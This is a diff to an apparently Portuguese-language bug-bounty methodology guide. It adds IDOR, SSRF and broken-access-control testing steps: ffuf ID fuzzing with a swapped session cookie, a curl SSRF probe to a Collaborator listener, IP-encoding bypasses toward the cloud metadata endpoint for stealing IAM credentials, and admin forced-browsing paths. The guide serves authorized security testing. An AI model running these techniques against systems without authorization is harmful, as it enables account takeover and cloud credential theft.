@@ -15,7 +15,7 @@
 |---------|-------------|
 | 1. [Initial Notes](#1-initial-notes-and-create-account) | Initial Notes About Application |
 | 2. [Reconnaissance](#2-reconnaissance-and-subdomain-enumeration) | Subdomain Enumeration & Initial Scanning |
-| 3. [Discovery](#3-discovery-and-probing) | Probing, Vulnerability Scanning & Analysis |
+| 3. [OWASP 10](#3-OWASP-10) | Probing, Vulnerability Scanning & Analysis |
 | 4. [Business Logic](#4-business-logic) | Burp Testing |
 | 5. [POC Creation](#5-proof-of-concept-poc-creation) | Documentation & Evidence |
 | 6. [Reporting](#6-reporting) | Final Documentation |
@@ -83,7 +83,7 @@ grep "\[200\]" live.txt > 200.txt
 ---
 <br>
 
-## **3. Discovery and Probing**
+## **3. OWASP 10**
 **🛠️Tools:** [OpenRedirex](https://github.com/devanshbatham/OpenRedirex)
 
 <br>
@@ -171,6 +171,81 @@ chmod +x check_takeover.sh
 ```bash
 ./final_takeover.sh
 ```
+
+<br>
+
+**🐞IDOR (Insecure Direct Object Reference)**
+
+*   Mapeie todos os endpoints que recebem um ID (numérico, UUID, hash) — `/api/user/123`, `/invoice?id=456`, `/order/789/details`
+*   Crie 2 contas (User A e User B) e troque os IDs entre sessões
+
+```bash
+# Extrair todos os parâmetros que parecem IDs
+cat all_urls_dedup.txt | grep -E '\?(id|user_id|uid|account|order|invoice|doc)=' > idor_candidatos.txt
+```
+
+```bash
+# Testar substituição de ID com Burp Intruder ou ffuf autorizado (autenticado)
+ffuf -u "https://target.com/api/user/FUZZ" -H "Cookie: session=USERB_TOKEN" -w ids.txt -mc 200
+```
+
+*   Teste tanto **incremento numérico** (1, 2, 3...) quanto **IDOR em UUID** (trocar o UUID de outro usuário capturado em algum lugar do app — comentários, avatars, exports)
+*   Teste em métodos diferentes: GET, PUT, DELETE, PATCH (BAC + IDOR combinados)
+
+<br>
+
+**🐞SSRF (Server-Side Request Forgery)**
+
+*   Procure funcionalidades que fazem requisições a partir do servidor: importar imagem por URL, webhook, PDF generator, preview de link, integração com API externa
+
+```bash
+cat all_urls_dedup.txt | gf ssrf > ssrf_candidatos.txt
+```
+
+```bash
+# Testar com seu próprio listener (Burp Collaborator, interactsh, ou webhook.site)
+curl -X POST https://target.com/api/import -d '{"url":"http://SEU_COLLABORATOR.oastify.com"}'
+```
+
+*   Bypass de blacklist de IP interno:
+```bash
+http://127.0.0.1
+http://localhost
+http://0.0.0.0
+http://[::1]
+http://127.1
+http://2130706433        (decimal de 127.0.0.1)
+http://0x7f000001        (hex de 127.0.0.1)
+http://169.254.169.254/latest/meta-data/   (cloud metadata AWS/GCP/Azure)
+```
+
+*   Se confirmado, testar acesso a metadata de cloud (AWS/GCP/Azure) para vazamento de credenciais/IAM role
+
+<br>
+
+**🐞Broken Access Control (BAC)**
+
+*   Compare respostas entre usuário autenticado vs não autenticado vs usuário de outro nível de permissão (admin/user/guest)
+
+```bash
+# Repetir todas as requisições autenticadas sem cookie/token
+curl -i https://target.com/api/admin/users
+curl -i -H "Cookie: session=" https://target.com/api/admin/users
+```
+
+*   Teste **Forced Browsing** em rotas administrativas comuns:
+```bash
+/admin
+/admin/dashboard
+/internal
+/api/v1/admin
+/manage
+/console
+```
+
+*   Teste manipulação de role/parâmetro em requisições (`"role":"user"` → `"role":"admin"`, `"isAdmin":false` → `"isAdmin":true`)
+
+<br>
 
 ---
 <br>
